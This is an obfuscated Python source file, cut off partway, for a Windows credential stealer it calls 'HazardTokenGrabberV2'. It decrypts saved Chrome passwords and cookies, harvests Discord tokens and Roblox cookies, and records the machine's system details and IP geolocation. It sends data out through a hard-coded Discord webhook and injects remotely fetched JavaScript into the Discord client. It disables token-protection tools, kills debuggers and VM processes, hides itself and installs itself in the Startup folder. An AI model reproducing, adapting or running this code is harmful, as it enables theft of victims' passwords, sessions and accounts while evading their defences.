import os #line:1
import re #line:2
import json #line:3
import httpx #line:4
import ntpath #line:5
import random #line:6
import winreg #line:7
import ctypes #line:8
import shutil #line:9
import psutil #line:10
import asyncio #line:11
import sqlite3 #line:12
import zipfile #line:13
import threading #line:14
import subprocess #line:15
from sys import argv #line:17
from PIL import ImageGrab #line:18
from base64 import b64decode #line:19
from Crypto .Cipher import AES #line:20
from tempfile import mkdtemp ,gettempdir #line:21
from win32crypt import CryptUnprotectData #line:22
from datetime import datetime ,timezone ,timedelta #line:23
__author__ ="Rdimo"#line:25
__version__ ='1.8.6'#line:26
__license__ ="GPL-3.0"#line:27
__config__ ={'webhook':"https://discord.com/api/webhooks/987794670463631391/Kf1owZ3f3kWcOJB4OO_PEXkWIfmUOD5n1dt7uMboRUSA_V01m-LPgADnjJ2wak_uST1P",'webhook_protector_key':"KEY_HERE",'injection_url':"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",'ping_on_run':False ,'kill_processes':True ,'startup':True ,'hide_self':True ,'anti_debug':True ,'blackListedPrograms':["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]}#line:81
Victim =os .getlogin ()#line:83
Victim_pc =os .getenv ("COMPUTERNAME")#line:84
ram =str (psutil .virtual_memory ()[0 ]/1024 **3 ).split (".")[0 ]#line:85
disk =str (psutil .disk_usage ('/')[0 ]/1024 **3 ).split (".")[0 ]#line:86
class Functions (object ):#line:89
    @staticmethod #line:90
    def get_master_key (OO0O000O0OOOOO0O0 )->str :#line:91
        if not ntpath .exists (OO0O000O0OOOOO0O0 ):#line:92
            return None #line:93
        with open (OO0O000O0OOOOO0O0 ,"r",encoding ="utf-8")as O00OOOOO00OO0O000 :#line:94
            O0O0OO0O0O000O0OO =O00OOOOO00OO0O000 .read ()#line:95
        OOOO0O0OOO00OO0OO =json .loads (O0O0OO0O0O000O0OO )#line:96
        try :#line:98
            O000O000O0O0O0000 =b64decode (OOOO0O0OOO00OO0OO ["os_crypt"]["encrypted_key"])#line:99
            return Functions .win_decrypt (O000O000O0O0O0000 [5 :])#line:100
        except KeyError :#line:101
            return None #line:102
    @staticmethod #line:104
    def convert_time (O0O00000O0OOOOO00 ):#line:105
        try :#line:106
            O0OO0O0OO0O00O000 =datetime (1601 ,1 ,1 ,tzinfo =timezone .utc )#line:107
            O00O0OO0O0OO00O00 =O0OO0O0OO0O00O000 +timedelta (microseconds =O0O00000O0OOOOO00 )#line:108
            return O00O0OO0O0OO00O00 #line:109
        except Exception :#line:110
            pass #line:111
    @staticmethod #line:113
    def win_decrypt (OOOO0OOOOOO0O0OOO :bytes )->str :#line:114
        return CryptUnprotectData (OOOO0OOOOOO0O0OOO ,None ,None ,None ,0 )[1 ]#line:115
    @staticmethod #line:117
    def create_temp_file (_dir :str or os .PathLike =gettempdir ()):#line:118
        OOOOOO00000OO0OOO =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _OO0000000O00O0O00 in range (random .randint (10 ,20 )))#line:119
        OOOO0000OOOOOO000 =ntpath .join (_dir ,OOOOOO00000OO0OOO )#line:120
        open (OOOO0000OOOOOO000 ,"x")#line:121
        return OOOO0000OOOOOO000 #line:122
    @staticmethod #line:124
    def decrypt_val (O00O00OOOOOOOO0O0 ,OOOO00O0OOOOO00O0 )->str :#line:125
        try :#line:126
            OO0OO0000O00O0000 =O00O00OOOOOOOO0O0 [3 :15 ]#line:127
            OOOO00000OO00OO00 =O00O00OOOOOOOO0O0 [15 :]#line:128
            OOOOO0OOO000O0OOO =AES .new (OOOO00O0OOOOO00O0 ,AES .MODE_GCM ,OO0OO0000O00O0000 )#line:129
            O0000OOO000OOO00O =OOOOO0OOO000O0OOO .decrypt (OOOO00000OO00OO00 )#line:130
            O0000OOO000OOO00O =O0000OOO000OOO00O [:-16 ].decode ()#line:131
            return O0000OOO000OOO00O #line:132
        except Exception :#line:133
            return f'Failed to decrypt "{str(O00O00OOOOOOOO0O0)}" | key: "{str(OOOO00O0OOOOO00O0)}"'#line:134
    @staticmethod #line:136
    def get_headers (token :str =None ):#line:137
        OO0O00O0O0OO00O0O ={"Content-Type":"application/json",}#line:140
        if token :#line:141
            OO0O00O0O0OO00O0O .update ({"Authorization":token })#line:142
        return OO0O00O0O0OO00O0O #line:143
    @staticmethod #line:145
    def system_info ()->list :#line:146
        O00OOOOO0O00OOOOO =0x08000000 #line:147
        OOOOOOOOO000OOOO0 ="wmic csproduct get uuid"#line:148
        OOOOO00O00OO0OOOO ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"#line:149
        OOO00OOO0O00OO0O0 ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"#line:150
        try :#line:151
            OO0O0OO0O0OO00OOO =subprocess .check_output (OOOOOOOOO000OOOO0 ,creationflags =O00OOOOO0O00OOOOO ).decode ().split ('\n')[1 ].strip ()#line:152
        except Exception :#line:153
            OO0O0OO0O0OO00OOO ="N/A"#line:154
        try :#line:155
            OOO0O0OOO0OOOO00O =subprocess .check_output (OOOOO00O00OO0OOOO ,creationflags =O00OOOOO0O00OOOOO ).decode ().rstrip ()#line:156
        except Exception :#line:157
            OOO0O0OOO0OOOO00O ="N/A"#line:158
        try :#line:159
            OO00OOOO0O0OO0000 =subprocess .check_output (OOO00OOO0O00OO0O0 ,creationflags =O00OOOOO0O00OOOOO ).decode ().rstrip ()#line:160
        except Exception :#line:161
            OO00OOOO0O0OO0000 ="N/A"#line:162
        return [OO0O0OO0O0OO00OOO ,OO00OOOO0O0OO0000 ,OOO0O0OOO0OOOO00O ]#line:163
    @staticmethod #line:165
    def network_info ()->list :#line:166
        O0O0OO0000OO00OOO ,OO00O0000OO0O0OOO ,OOOO0O00O00O0O0O0 ,OO000O0O00O0OO0O0 ,OOO0OO0O00O0O0O0O ,O00O0OO0000O00OOO ,OOOO000OO000000O0 ="None","None","None","None","None","None","None"#line:167
        O0OOOO0O0O0000O00 =httpx .get ("https://ipinfo.io/json")#line:168
        if O0OOOO0O0O0000O00 .status_code ==200 :#line:169
            O00000O0000000O0O =O0OOOO0O0O0000O00 .json ()#line:170
            O0O0OO0000OO00OOO =O00000O0000000O0O .get ('ip')#line:171
            OO00O0000OO0O0OOO =O00000O0000000O0O .get ('city')#line:172
            OOOO0O00O00O0O0O0 =O00000O0000000O0O .get ('country')#line:173
            OO000O0O00O0OO0O0 =O00000O0000000O0O .get ('region')#line:174
            OOO0OO0O00O0O0O0O =O00000O0000000O0O .get ('org')#line:175
            O00O0OO0000O00OOO =O00000O0000000O0O .get ('loc')#line:176
            OOOO000OO000000O0 ="https://www.google.com/maps/search/google+map++"+O00O0OO0000O00OOO #line:177
        return [O0O0OO0000OO00OOO ,OO00O0000OO0O0OOO ,OOOO0O00O00O0O0O0 ,OO000O0O00O0OO0O0 ,OOO0OO0O00O0O0O0O ,O00O0OO0000O00OOO ,OOOO000OO000000O0 ]#line:178
    @staticmethod #line:180
    def fetch_conf (O00OO00O0O0OO00O0 :str )->str or bool |None :#line:181
        return __config__ .get (O00OO00O0O0OO00O0 )#line:182
class HazardTokenGrabberV2 (Functions ):#line:185
    def __init__ (OO00000OO0000OOOO ):#line:186
        OO00000OO0000OOOO .webhook =OO00000OO0000OOOO .fetch_conf ('webhook')#line:187
        OO00000OO0000OOOO .discordApi ="https://discord.com/api/v9/users/@me"#line:188
        OO00000OO0000OOOO .appdata =os .getenv ("localappdata")#line:189
        OO00000OO0000OOOO .roaming =os .getenv ("appdata")#line:190
        OO00000OO0000OOOO .chrome =ntpath .join (OO00000OO0000OOOO .appdata ,'Google','Chrome','User Data')#line:191
        OO00000OO0000OOOO .dir ,OO00000OO0000OOOO .temp =mkdtemp (),gettempdir ()#line:192
        OOO0000O00O000OO0 ,O0000OOO00OO0000O =OO00000OO0000OOOO .system_info (),OO00000OO0000OOOO .network_info ()#line:193
        OO00000OO0000OOOO .hwid ,OO00000OO0000OOOO .winver ,OO00000OO0000OOOO .winkey =OOO0000O00O000OO0 [0 ],OOO0000O00O000OO0 [1 ],OOO0000O00O000OO0 [2 ]#line:194
        OO00000OO0000OOOO .ip ,OO00000OO0000OOOO .city ,OO00000OO0000OOOO .country ,OO00000OO0000OOOO .region ,OO00000OO0000OOOO .org ,OO00000OO0000OOOO .loc ,OO00000OO0000OOOO .googlemap =O0000OOO00OO0000O [0 ],O0000OOO00OO0000O [1 ],O0000OOO00OO0000O [2 ],O0000OOO00OO0000O [3 ],O0000OOO00OO0000O [4 ],O0000OOO00OO0000O [5 ],O0000OOO00OO0000O [6 ]#line:195
        OO00000OO0000OOOO .startup_loc =ntpath .join (OO00000OO0000OOOO .roaming ,'Microsoft','Windows','Start Menu','Programs','Startup')#line:196
        OO00000OO0000OOOO .hook_reg ="api/webhooks"#line:198
        OO00000OO0000OOOO .chrome_reg =re .compile (r'^(profile\s\d*)|(default)|(guest profile)$',re .IGNORECASE |re .MULTILINE )#line:199
        OO00000OO0000OOOO .regex =r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"#line:200
        OO00000OO0000OOOO .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:201
        OO00000OO0000OOOO .sep =os .sep #line:203
        OO00000OO0000OOOO .tokens =[]#line:204
        OO00000OO0000OOOO .robloxcookies =[]#line:205
        OO00000OO0000OOOO .chrome_key =OO00000OO0000OOOO .get_master_key (ntpath .join (OO00000OO0000OOOO .chrome ,"Local State"))#line:206
        os .makedirs (OO00000OO0000OOOO .dir ,exist_ok =True )#line:208
    def try_extract (O0OO0O0O0OOO0O0OO ):#line:210
        ""#line:211
        def OO0000O0OOO00O00O (*OO0OO0OO000OO0OOO ,**O000OO00000OOOO0O ):#line:212
            try :#line:213
                O0OO0O0O0OOO0O0OO (*OO0OO0OO000OO0OOO ,**O000OO00000OOOO0O )#line:214
            except Exception :#line:215
                pass #line:216
        return OO0000O0OOO00O00O #line:217
    async def checkToken (OO0OOOO0O0OOO0000 ,OO00OOOOOOO0O0000 :str )->str :#line:219
        try :#line:220
            OOOOOO0000O0O0O00 =httpx .get (url =OO0OOOO0O0OOO0000 .discordApi ,headers =OO0OOOO0O0OOO0000 .get_headers (OO00OOOOOOO0O0000 ),timeout =5.0 )#line:225
        except (httpx ._exceptions .ConnectTimeout ,httpx ._exceptions .TimeoutException ):#line:226
            pass #line:227
        if OOOOOO0000O0O0O00 .status_code ==200 and OO00OOOOOOO0O0000 not in OO0OOOO0O0OOO0000 .tokens :#line:228
            OO0OOOO0O0OOO0000 .tokens .append (OO00OOOOOOO0O0000 )#line:229
    async def init (O0OO0OO00OOO0O0OO ):#line:231
        if O0OO0OO00OOO0O0OO .webhook ==""or O0OO0OO00OOO0O0OO .webhook =="\x57EBHOOK_HERE":#line:232
            os ._exit (0 )#line:233
        if O0OO0OO00OOO0O0OO .fetch_conf ('anti_debug')and AntiDebug ().inVM :#line:234
            os ._exit (0 )#line:235
        await O0OO0OO00OOO0O0OO .bypassBetterDiscord ()#line:236
        await O0OO0OO00OOO0O0OO .bypassTokenProtector ()#line:237
        O0OOOO00O00OO00OO =[O0OO0OO00OOO0O0OO .screenshot ,O0OO0OO00OOO0O0OO .sys_dump ,O0OO0OO00OOO0O0OO .grab_tokens ,O0OO0OO00OOO0O0OO .grabRobloxCookie ]#line:238
        if O0OO0OO00OOO0O0OO .fetch_conf ('hide_self'):#line:239
            O0OOOO00O00OO00OO .append (O0OO0OO00OOO0O0OO .hide )#line:240
        if O0OO0OO00OOO0O0OO .fetch_conf ('kill_processes'):#line:242
            await O0OO0OO00OOO0O0OO .killProcesses ()#line:243
        if O0OO0OO00OOO0O0OO .fetch_conf ('startup'):#line:245
            O0OOOO00O00OO00OO .append (O0OO0OO00OOO0O0OO .startup )#line:246
        if ntpath .exists (O0OO0OO00OOO0O0OO .chrome )and O0OO0OO00OOO0O0OO .chrome_key is not None :#line:248
            O0OOOO00O00OO00OO .extend ([O0OO0OO00OOO0O0OO .grabPassword ,O0OO0OO00OOO0O0OO .grabCookies ,O0OO0OO00OOO0O0OO .grabHistory ])#line:249
        for OOO0O0000O0O0O0OO in O0OOOO00O00OO00OO :#line:251
            OOOOOO00O00OO000O =threading .Thread (target =OOO0O0000O0O0O0OO ,daemon =True )#line:252
            OOOOOO00O00OO000O .start ()#line:253
        for O0OO0O0OOOOO0OO0O in threading .enumerate ():#line:254
            try :#line:255
                O0OO0O0OOOOO0OO0O .join ()#line:256
            except RuntimeError :#line:257
                continue #line:258
        O0OO0OO00OOO0O0OO .neatifyTokens ()#line:259
        await O0OO0OO00OOO0O0OO .injector ()#line:260
        O0OO0OO00OOO0O0OO .finish ()#line:261
    def hide (O0O00OOOOOOO0OO00 ):#line:263
        ctypes .windll .kernel32 .SetFileAttributesW (argv [0 ],2 )#line:264
    def startup (O0O0OOOO0O000O00O ):#line:266
        try :#line:267
            shutil .copy2 (argv [0 ],O0O0OOOO0O000O00O .startup_loc )#line:268
        except Exception :#line:269
            pass #line:270
    async def injector (OO00O0OOOOO0OOOO0 ):#line:272
        for _O0OO00O0O0O0O0O0O in os .listdir (OO00O0OOOOO0OOOO0 .appdata ):#line:273
            if 'discord'in _O0OO00O0O0O0O0O0O .lower ():#line:274
                OO0OO0O0O0O00000O =OO00O0OOOOO0OOOO0 .appdata +os .sep +_O0OO00O0O0O0O0O0O #line:275
                for __O00O0OOO000O0OOO0 in os .listdir (ntpath .abspath (OO0OO0O0O0O00000O )):#line:276
                    if re .match (r'app-(\d*\.\d*)*',__O00O0OOO000O0OOO0 ):#line:277
                        O0OOOO0OOOOO0O00O =ntpath .abspath (ntpath .join (OO0OO0O0O0O00000O ,__O00O0OOO000O0OOO0 ))#line:278
                        OO00OO000000O00O0 =ntpath .join (O0OOOO0OOOOO0O00O ,'modules')#line:279
                        if not ntpath .exists (OO00OO000000O00O0 ):#line:280
                            return #line:281
                        for __O00OO0OOOO000O000 in os .listdir (OO00OO000000O00O0 ):#line:282
                            if re .match (r"discord_desktop_core-\d+",__O00OO0OOOO000O000 ):#line:283
                                O0OO0OOOO0OO00OOO =OO00OO000000O00O0 +os .sep +__O00OO0OOOO000O000 +f'\\discord_desktop_core\\'#line:284
                                if ntpath .exists (O0OO0OOOO0OO00OOO ):#line:285
                                    if OO00O0OOOOO0OOOO0 .startup_loc not in argv [0 ]:#line:286
                                        try :#line:287
                                            os .makedirs (O0OO0OOOO0OO00OOO +'initiation',exist_ok =True )#line:288
                                        except PermissionError :#line:289
                                            pass #line:290
                                    if OO00O0OOOOO0OOOO0 .hook_reg in OO00O0OOOOO0OOOO0 .webhook :#line:291
                                        O0OO0OOO00O0O00O0 =httpx .get (OO00O0OOOOO0OOOO0 .fetch_conf ('injection_url')).text .replace ("%WEBHOOK%",OO00O0OOOOO0OOOO0 .webhook )#line:292
                                    else :#line:293
                                        O0OO0OOO00O0O00O0 =httpx .get (OO00O0OOOOO0OOOO0 .fetch_conf ('injection_url')).text .replace ("%WEBHOOK%",OO00O0OOOOO0OOOO0 .webhook ).replace ("%WEBHOOK_KEY%",OO00O0OOOOO0OOOO0 .fetch_conf ('webhook_protector_key'))#line:297
                                    try :#line:298
                                        with open (O0OO0OOOO0OO00OOO +'index.js','w',errors ="ignore")as O000OO0O0O0000OOO :#line:299
                                            O000OO0O0O0000OOO .write (O0OO0OOO00O0O00O0 )#line:300
                                    except PermissionError :#line:301
                                        pass #line:302
                                    if OO00O0OOOOO0OOOO0 .fetch_conf ('kill_processes'):#line:303
                                        os .startfile (O0OOOO0OOOOO0O00O +OO00O0OOOOO0OOOO0 .sep +_O0OO00O0O0O0O0O0O +'.exe')#line:304
    async def killProcesses (O00OOOO0O0000O00O ):#line:306
        OOO00O00O000OO0O0 =O00OOOO0O0000O00O .fetch_conf ('blackListedPrograms')#line:307
        for O00O000O0O00O0OO0 in ['discord','discordtokenprotector','discordcanary','discorddevelopment','discordptb']:#line:308
            OOO00O00O000OO0O0 .append (O00O000O0O00O0OO0 )#line:309
        for O0OOO000OO0OO0OO0 in psutil .process_iter ():#line:310
            if any (OO00OOO0O0O0OO000 in O0OOO000OO0OO0OO0 .name ().lower ()for OO00OOO0O0O0OO000 in OOO00O00O000OO0O0 ):#line:311
                try :#line:312
                    O0OOO000OO0OO0OO0 .kill ()#line:313
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:314
                    pass #line:315
    async def bypassTokenProtector (OOO00O0OOOO0O0OO0 ):#line:317
        OOO0000O0O0000O00 =f"{OOO00O0OOOO0O0OO0.roaming}\\DiscordTokenProtector\\"#line:319
        if not ntpath .exists (OOO0000O0O0000O00 ):#line:320
            return #line:321
        OO00OOOOO00OO0O00 =OOO0000O0O0000O00 +"config.json"#line:322
        for O0O0O0OOOOO0O00O0 in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:324
            try :#line:325
                os .remove (OOO0000O0O0000O00 +O0O0O0OOOOO0O00O0 )#line:326
            except FileNotFoundError :#line:327
                pass #line:328
        if ntpath .exists (OO00OOOOO00OO0O00 ):#line:329
            with open (OO00OOOOO00OO0O00 ,errors ="ignore")as O00O0OO0O0O00000O :#line:330
                try :#line:331
                    OOOOO0OOOO000OOOO =json .load (O00O0OO0O0O00000O )#line:332
                except json .decoder .JSONDecodeError :#line:333
                    return #line:334
                OOOOO0OOOO000OOOO ['Rdimo_just_shit_on_this_token_protector']="https://github.com/Rdimo"#line:335
                OOOOO0OOOO000OOOO ['auto_start']=False #line:336
                OOOOO0OOOO000OOOO ['auto_start_discord']=False #line:337
                OOOOO0OOOO000OOOO ['integrity']=False #line:338
                OOOOO0OOOO000OOOO ['integrity_allowbetterdiscord']=False #line:339
                OOOOO0OOOO000OOOO ['integrity_checkexecutable']=False #line:340
                OOOOO0OOOO000OOOO ['integrity_checkhash']=False #line:341
                OOOOO0OOOO000OOOO ['integrity_checkmodule']=False #line:342
                OOOOO0OOOO000OOOO ['integrity_checkscripts']=False #line:343
                OOOOO0OOOO000OOOO ['integrity_checkresource']=False #line:344
                OOOOO0OOOO000OOOO ['integrity_redownloadhashes']=False #line:345
                OOOOO0OOOO000OOOO ['iterations_iv']=364 #line:346
                OOOOO0OOOO000OOOO ['iterations_key']=457 #line:347
                OOOOO0OOOO000OOOO ['version']=69420 #line:348
            with open (OO00OOOOO00OO0O00 ,'w')as O00O0OO0O0O00000O :#line:349
                json .dump (OOOOO0OOOO000OOOO ,O00O0OO0O0O00000O ,indent =2 ,sort_keys =True )#line:350
            with open (OO00OOOOO00OO0O00 ,'a')as O00O0OO0O0O00000O :#line:351
                O00O0OO0O0O00000O .write ("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")#line:352
    async def bypassBetterDiscord (OOO00OOOOO00O0OO0 ):#line:354
        OOO0O00O0000OO00O =OOO00OOOOO00O0OO0 .roaming +"\\BetterDiscord\\data\\betterdiscord.asar"#line:355
        if ntpath .exists (OOO0O00O0000OO00O ):#line:356
            OOOO0O0O0O0O0O0OO =OOO00OOOOO00O0OO0 .hook_reg #line:357
            with open (OOO0O00O0000OO00O ,'r',encoding ="cp437",errors ='ignore')as O00O00O0OOOO0OO0O :#line:358
                OOO0OOO0OO0OO0OOO =O00O00O0OOOO0OO0O .read ()#line:359
                OO0000O00OO00O0OO =OOO0OOO0OO0OO0OOO .replace (OOOO0O0O0O0O0O0OO ,'RdimoTheGoat')#line:360
            with open (OOO0O00O0000OO00O ,'w',newline ='',encoding ="cp437",errors ='ignore')as O00O00O0OOOO0OO0O :#line:361
                O00O00O0OOOO0OO0O .write (OO0000O00OO00O0OO )#line:362
    @try_extract #line:364
    def grab_tokens (OO0OO000OO0OOO0OO ):#line:365
        OO0OOOOOO0OOO0O00 ={'Discord':OO0OO000OO0OOO0OO .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':OO0OO000OO0OOO0OO .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':OO0OO000OO0OOO0OO .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':OO0OO000OO0OOO0OO .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':OO0OO000OO0OOO0OO .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':OO0OO000OO0OOO0OO .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':OO0OO000OO0OOO0OO .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':OO0OO000OO0OOO0OO .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':OO0OO000OO0OOO0OO .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':OO0OO000OO0OOO0OO .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':OO0OO000OO0OOO0OO .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':OO0OO000OO0OOO0OO .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':OO0OO000OO0OOO0OO .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':OO0OO000OO0OOO0OO .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':OO0OO000OO0OOO0OO .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':OO0OO000OO0OOO0OO .chrome +'\\Default\\Local Storage\\leveldb\\','Epic Privacy Browser':OO0OO000OO0OOO0OO .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':OO0OO000OO0OOO0OO .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':OO0OO000OO0OOO0OO .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':OO0OO000OO0OOO0OO .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':OO0OO000OO0OOO0OO .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':OO0OO000OO0OOO0OO .appdata +'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:389
        for O0OOOOO0OO0OO0OOO ,O0000OOOO00OOOO00 in OO0OOOOOO0OOO0O00 .items ():#line:391
            if not ntpath .exists (O0000OOOO00OOOO00 ):#line:392
                continue #line:393
            OO00OO00OOOO000O0 =O0OOOOO0OO0OO0OOO .replace (" ","").lower ()#line:394
            if "cord"in O0000OOOO00OOOO00 :#line:395
                if ntpath .exists (OO0OO000OO0OOO0OO .roaming +f'\\{OO00OO00OOOO000O0}\\Local State'):#line:396
                    for OO0O00O0O0O00O00O in os .listdir (O0000OOOO00OOOO00 ):#line:397
                        if OO0O00O0O0O00O00O [-3 :]not in ["log","ldb"]:#line:398
                            continue #line:399
                        for OOOO0O00O0OOO0OOO in [OOOOOOOOOO0OOO0O0 .strip ()for OOOOOOOOOO0OOO0O0 in open (f'{O0000OOOO00OOOO00}\\{OO0O00O0O0O00O00O}',errors ='ignore').readlines ()if OOOOOOOOOO0OOO0O0 .strip ()]:#line:400
                            for OO0OOO00O0OO0O0OO in re .findall (OO0OO000OO0OOO0OO .encrypted_regex ,OOOO0O00O0OOO0OOO ):#line:401
                                O000OOO0O0OOO0O00 =OO0OO000OO0OOO0OO .decrypt_val (b64decode (OO0OOO00O0OO0O0OO .split ('dQw4w9WgXcQ:')[1 ]),OO0OO000OO0OOO0OO .get_master_key (OO0OO000OO0OOO0OO .roaming +f'\\{OO00OO00OOOO000O0}\\Local State'))#line:402
                                asyncio .run (OO0OO000OO0OOO0OO .checkToken (O000OOO0O0OOO0O00 ))#line:403
            else :#line:404
                for OO0O00O0O0O00O00O in os .listdir (O0000OOOO00OOOO00 ):#line:405
                    if OO0O00O0O0O00O00O [-3 :]not in ["log","ldb"]:#line:406
                        continue #line:407
                    for OOOO0O00O0OOO0OOO in [O0OO00O0000000OOO .strip ()for O0OO00O0000000OOO in open (f'{O0000OOOO00OOOO00}\\{OO0O00O0O0O00O00O}',errors ='ignore').readlines ()if O0OO00O0000000OOO .strip ()]:#line:408
                        for O000OOO0O0OOO0O00 in re .findall (OO0OO000OO0OOO0OO .regex ,OOOO0O00O0OOO0OOO ):#line:409
                            asyncio .run (OO0OO000OO0OOO0OO .checkToken (O000OOO0O0OOO0O00 ))#line:410
        if ntpath .exists (OO0OO000OO0OOO0OO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:412
            for O0000OOOO00OOOO00 ,_O0O0O0OOOO0OOO0O0 ,OOO00OOO000O00000 in os .walk (OO0OO000OO0OOO0OO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:413
                for _OO00OOOOOOO0OO0O0 in OOO00OOO000O00000 :#line:414
                    if not _OO00OOOOOOO0OO0O0 .endswith ('.sqlite'):#line:415
                        continue #line:416
                    for OOOO0O00O0OOO0OOO in [O000O0O0OOOO00OOO .strip ()for O000O0O0OOOO00OOO in open (f'{O0000OOOO00OOOO00}\\{_OO00OOOOOOO0OO0O0}',errors ='ignore').readlines ()if O000O0O0OOOO00OOO .strip ()]:#line:417
                        for O000OOO0O0OOO0O00 in re .findall (OO0OO000OO0OOO0OO .regex ,OOOO0O00O0OOO0OOO ):#line:418
                            asyncio .run (OO0OO000OO0OOO0OO .checkToken (O000OOO0O0OOO0O00 ))#line:419
    @try_extract #line:421
    def grabPassword (O0OOO000O000OO000 ):#line:422
        O000OO0O0O0O0OO00 =open (O0OOO000O000OO000 .dir +'\\Google Passwords.txt','w',encoding ="cp437",errors ='ignore')#line:423
        for OOO0OO000O0OOOOO0 in os .listdir (O0OOO000O000OO000 .chrome ):#line:424
            if re .match (O0OOO000O000OO000 .chrome_reg ,OOO0OO000O0OOOOO0 ):#line:425
                O00O0O0000O0OOO00 =ntpath .join (O0OOO000O000OO000 .chrome ,OOO0OO000O0OOOOO0 ,'Login Data')#line:426
                OOOO000O000OOO000 =O0OOO000O000OO000 .create_temp_file ()#line:427
                shutil .copy2 (O00O0O0000O0OOO00 ,OOOO000O000OOO000 )#line:429
                OO00OOOOO00OOOO0O =sqlite3 .connect (OOOO000O000OOO000 )#line:430
                OOOOO0OOOO00O0OO0 =OO00OOOOO00OOOO0O .cursor ()#line:431
                OOOOO0OOOO00O0OO0 .execute ("SELECT action_url, username_value, password_value FROM logins")#line:432
                for OOOO0OOO0000OOO00 in OOOOO0OOOO00O0OO0 .fetchall ():#line:434
                    OOO000000000O0OO0 =OOOO0OOO0000OOO00 [0 ]#line:435
                    O00OOO0OO00OOO000 =OOOO0OOO0000OOO00 [1 ]#line:436
                    OOOO00OO00OOOOO0O =OOOO0OOO0000OOO00 [2 ]#line:437
                    O00O0O0OOOOO000OO =O0OOO000O000OO000 .decrypt_val (OOOO00OO00OOOOO0O ,O0OOO000O000OO000 .chrome_key )#line:438
                    if OOO000000000O0OO0 !="":#line:439
                        O000OO0O0O0O0OO00 .write (f"Domain: {OOO000000000O0OO0}\nUser: {O00OOO0OO00OOO000}\nPass: {O00O0O0OOOOO000OO}\n\n")#line:440
                OOOOO0OOOO00O0OO0 .close ()#line:442
                OO00OOOOO00OOOO0O .close ()#line:443
                os .remove (OOOO000O000OOO000 )#line:444
        O000OO0O0O0O0OO00 .close ()#line:445
    @try_extract #line:447
    def grabCookies (OO0OO0OOO0OO0O000 ):#line:448
        OO00O000O0OOO000O =open (OO0OO0OOO0OO0O000 .dir +'\\Google Cookies.txt','w',encoding ="cp437",errors ='ignore')#line:449
        for O000O0OOO0O00OO00 in os .listdir (OO0OO0OOO0OO0O000 .chrome ):#line:450
            if re .match (OO0OO0OOO0OO0O000 .chrome_reg ,O000O0OOO0O00OO00 ):#line:451
                O0O0000O00OOO0000 =ntpath .join (OO0OO0OOO0OO0O000 .chrome ,O000O0OOO0O00OO00 ,'Network','cookies')#line:452
                OO000OOO00O00OO00 =OO0OO0OOO0OO0O000 .create_temp_file ()#line:453
                shutil .copy2 (O0O0000O00OOO0000 ,OO000OOO00O00OO00 )#line:455
                OO0000OO0000O000O =sqlite3 .connect (OO000OOO00O00OO00 )#line:456
                O00O00OO00O0OO0O0 =OO0000OO0000O000O .cursor ()#line:457
                O00O00OO00O0OO0O0 .execute ("SELECT host_key, name, encrypted_value from cookies")#line:458
                for O000OO0OO0O00000O in O00O00OO00O0OO0O0 .fetchall ():#line:460
                    O000O0O0O0O0000OO =O000OO0OO0O00000O [0 ]#line:461
                    O0O0OOOO0O0OO00OO =O000OO0OO0O00000O [1 ]#line:462
                    O00O00O000O0O0000 =OO0OO0OOO0OO0O000 .decrypt_val (O000OO0OO0O00000O [2 ],OO0OO0OOO0OO0O000 .chrome_key )#line:463
                    if O000O0O0O0O0000OO !="":#line:464
                        OO00O000O0OOO000O .write (f"HOST KEY: {O000O0O0O0O0000OO} | NAME: {O0O0OOOO0O0OO00OO} | VALUE: {O00O00O000O0O0000}\n")#line:465
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'in O00O00O000O0O0000 :#line:466
